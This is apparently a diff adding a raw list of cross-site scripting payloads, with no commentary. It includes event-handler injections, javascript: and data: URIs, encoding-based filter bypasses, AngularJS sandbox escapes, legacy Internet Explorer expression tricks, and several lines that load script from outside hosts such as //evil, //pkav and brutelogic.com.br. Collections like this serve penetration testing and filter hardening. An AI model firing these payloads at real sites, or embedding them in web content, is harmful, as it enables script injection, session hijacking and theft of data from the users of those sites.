@@ -1,0 +1,239 @@
+alert`1`
+\u{61}|\u{65}rt`1`
+'-alert(1)-'
+location=name
+setTimeout(location)
+gbk chatset:%bb\"alert(1)
+`$alert(1)}`
+"<!--script>"
+"oncut=alert(1)
+"autofocus/onfocus=alert(1)
+"onerror=alert(1)//
+delFeedback('&apos;)alert(1)'
+<![if<iframe
+-{valueOf:location,toString:[].pop,0:javascript:alert%281%29.source,length:1}
+eat backlash: %bb"alert(1) (GBK charset)
+prerequisite: \" => \\\"
+"<!--<script>"
+<img src="--></script><svg/onload=alert(1)//">
+<img src="--></script><svg/onload=alert(1)//"><!--<script>
+//[10,13,8232(utf-8),8233(utf-8)]alert(1)//
+*/alert(1)/*
+/*@cc_on-alert(1))
+//@cc_on-alert(1))
+"autofocus/onfocus=alert(1)
+"oncut=alert(1)
+onclick=alert(1)
+onclick="delFeedback('2&apos)alert(1)//')"
+onclick='addUser("23&quot)alert(1)//")'
+onclick='addUser("23&#000000000034)-alert(1)//")'
+<a language=vbs onclick='addUser(\"11\\\"&alert(1)\\\"\")'>add</a>
+javascript:alert%281%29
+javascript:%E2%80%A8alert`1`
+javascript&colon;alert(1)
+&newLine;javascript:alert(1)
+javascript:alert&lpar;1&rpar;
+java&#0000000000000000115;cript:name
+java&#x000000000000000073;cript:name
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html,< sc r i p t >alert(1)</sc r ip t>
+data:text/html,<script>alert(1)</script>
+data:),<script>alert(1)</script>
+data:text/html;charset=utf-8,<h1>abc
+data&colon;%2f%2f;ba se64;;//,P HNjcmlw dD5hbG VydC gxKTwvc2NyaXB0Pg= =
+vbscript:Msgbox+1
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">click</a>
+<input style="behavior: url(xss.txt)">
+<scriptlet> <implements type="behavior"/><script>alert(1)</script></scriptlet>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>
+vml.xml:<xml><rect style="height:100%;width:100%" id="xss" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false"/></xml>
+font-family:a/**/ression(alert(1))('\')exp\')
+font-family:expression(alert)(1)
+expr\65ssion(alert(1))
+{tag}<img name="{/tag} <img src=xx:x onerror=alert({{i}})//">
+<xmp><%</xmp><img alt='%></xmp><img src=xx:x onerror=alert(1)//'>
+<svg[9,10,12,13,32,47]onload=alert(1)>
+<img src=x[9,10,12,13,32]onerror="alert(1)">
+<! XSS="><img src=xx:x onerror=alert(1)//">
+alt=``onload=alert(1)
+alt='"name='onerror=alert()//'
+href=[0x0b]" onclick=alert(1)//
+<x '="foo"><x foo='><img src=x onerror=alert(1)//'>
+<input value="<script>alert(1)</script>" `/>
+<object data=//pkav/test.swf><param name=movie value=//pkav/test.swf><param name=allowscriptaccess value=always></object>
+<svg><script/xlink:href=data:,alert(1)></script>
+<svg contentScriptType=text/vbs><script>MsgBox"1"<i>
+<svg><script>alert&lpar;1&rpar;</script>
+<svg></y="><x" onload=alert(1)>
+<svg><style>*{font-family:'<svg onload=alert(1)>';}</style></svg>
+<math xlink:href=javascript:..>
+<math><a xlink:href=javascript:...>
+<math><style>*{font-family:'<img/src=xx:x onerror=alert(1)>'}</style>
+<math><style>*{font-family:'<img/src=xx:x onerror=alert(1)>'}</style>
+<link rel=import href=//evil>
+<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d>
+<iframe srcdoc='&lt;svg/onload=alert(1)&gt;'>
+<iframe srcdoc=\"&lt;iframe srcdoc='&amp;lt;iframe onload=alert(1)&amp;gt;'&gt;\"></iframe>
+<iframe src=\"data:),<script>alert(document.domain)</script>"></iframe>
+<embed src=evil.swf allowscriptaccess=always>
+<embed code=evil.swf allowscriptaccess=always>
+<base href="/\evil">
+<!--><svg onload=alert(1)> -->
+<!'="foo"><x foo='><img src=x onerror=alert(2)//'>
+<![if<iframe/onload=alert(1)//]>
+<![CDATA":
+<!doctype":
+<% contenteditable onresize=alert(1)>
+<?'="foo"><x foo='><img src=x onerror=alert(2)//'>
+<[00]script>alert(1)</[00]script>
+UTF-7: +ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
+window.name
+<b><noscript><a src='x' style='x:\3c\2fnoscript\3e\3ciframe/onload\3d alert(1)\3e'>
+<listing>&lt;img src=1 onerror=alert(1) &gt;</listing>
+<img src="test.jpg" alt ="``onload=xss()">
+<pkav xmlns="><iframe onload=alert(1)">123</pkav>
+<p style="font-family:'ar\27 \3bx\3a expression\28xss\28\29\29\3bial';"></p>
+<img src=1 style="font-fam\22onerror\3d alert\28 1\29\20 ily:'aaa';\">
+<% a=%&gt&lt;iframe/onload=alert(1)//>
+<img ="><script>alert(1)</script>">
+<div='x=&quot;&#39&gt;&lt;iframe/onload=alert(1)&gt;'>
+<a href="&#x3000;javascript:alert(1)">click</a>
+.attr
+.data
+.ajax
+React.createElement
+<b class="ng-include:'//evil''">
+<iframe ng-src=javascript:..>
+arg 1：alert(1)
+\"))}catch(e){alert(1)}//
+?q=%ED%A0%80\"))}catch(e){alert(1)}//
+var q:String=loaderInfo.parameters["q"].split("\\").join("\\\\");
+ExternalInterface.call("console.log",q);
+<img src=evil.swf>
+<a href=javascript:...>me</a>
+style=xss:'"/onclick=alert(1)//'
+style=\"xss:'" onclick="alert(1)//'"
+<embed allowscriptaccess="alwalwaysays" src="test.swf">
+<sc<script>ript>alert(1)</script>
+alt=""onclick="alert(1)"
+alt= onclick=alert(1)
+<img src="xx# onerror=alert(1)//{0xf09d8c86}">
+<a href="xxx# onclick=alert(1)//[64kb]"></a>
+<a href="xxx# onclick=alert(1)//[255]"></a>
+<iframe src="jar://html5sec.org/test.jar!/test.html"></iframe>
+<iframe src="javascript:'<script src=//pkav></script>'">
+<meta name=referrer content=never>
+<a href=//target rel=noreferer target=pkav>click</a>
+<svg/onload=eval(name)>
+<i/onclick=URL=name>
+script/src=//⒕₨
+<script>/*
+ */alert(1)/*
+*/</script>
+<link rel=import href=/upload/.....>
+<script src=/upload/...></script>
+-<script/defer>alert(1)</script>
+<iframe/src=about:blank onload=alert(1)>
+document.domain='qq.com'
+<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
+<script src="data:,alert(1)%250A-->
+<script>alert(1)</script
+<script>alert(1)%0d%0a-->%09</script
+<x>%00%00%00%00%00%00%00<script>alert(1)</script>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
+<script>location.href;'javascript:alert%281%29'</script>
+\');confirm(1);//
+<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
+<meter onmouseover="alert(1)"
+'">><div><meter onmouseover="alert(1)"</div>"
+>><marquee loop=1 width=0 onfinish=alert(1)>
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';
+<img/src=q onerror='new Function`al\ert\`1\``'>
+†‡•＜img src=a onerror=javascript:alert('test')>…‰€
+{{constructor.constructor('alert(1)')()}}
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+{{
+    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
+    'a'.constructor.prototype.charAt=''.valueOf; 
+    $eval('x=alert(1)//'); 
+}}
+{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 
+
+  'a'.constructor.prototype.charAt=[].join;
+  $eval('x=alert(1)//');  }}
+{{
+    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
+    $eval('x=alert(1)//'); 
+}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+<svg onload=alert(1)>
+"><svg onload=alert(1)>
+</tag><svg onload=alert(1)>
+"></tag><svg onload=alert(1)>
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+javascript:alert(1)
+data:text/html,<svg onload=alert(1)>
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+'}alert(1);{'
+'}alert(1)%0A{'
+\'}alert(1);{//
+</script><svg onload=alert(1)>
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+p=<svg/1='&q='onload=alert(1)>
+p=<svg 1='&q='onload='/*&r=*/alert(1)'>
+<img src=1 onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+data:text/html,<img src=1 onerror=alert(1)>
+data:text/html,<iframe src=javascript:alert(1)>
+<script src=data:,alert(1)>
+<script src=//brutelogic.com.br/1.js>
+<Svg OnLoad=alert(1)>
+<Script>alert(1)</Script>
+<svg onload=alert(1)//
+<svg onload="alert(1)"
+<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
+<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>
+<script/x>alert(1)</script>
+%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+setInterval`alert\x28document.domain\x29`
+setTimeout`alert\x28document.domain\x29`
+<svg onload=alert&lpar;1&rpar;>
+<svg onload=alert&#40;1&#41>
+[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']
+('\141\154\145\162\164\50\61\51')()
+"o<x>nmouseover=alert<x>(1)//
+"autof<x>ocus o<x>nfocus=alert<x>(1)//
+&lt;svg/onload&equals;alert(1)&gt;
+<script src=https://www.google.com/complete/search?client=chrome
+%26jsonp=alert(1);></script>
+<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js>
+</script><x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}
+'"</Script><Html /Onmouseover=(alert)(1) //
+<img
+src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
+onload=alert(1)>
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
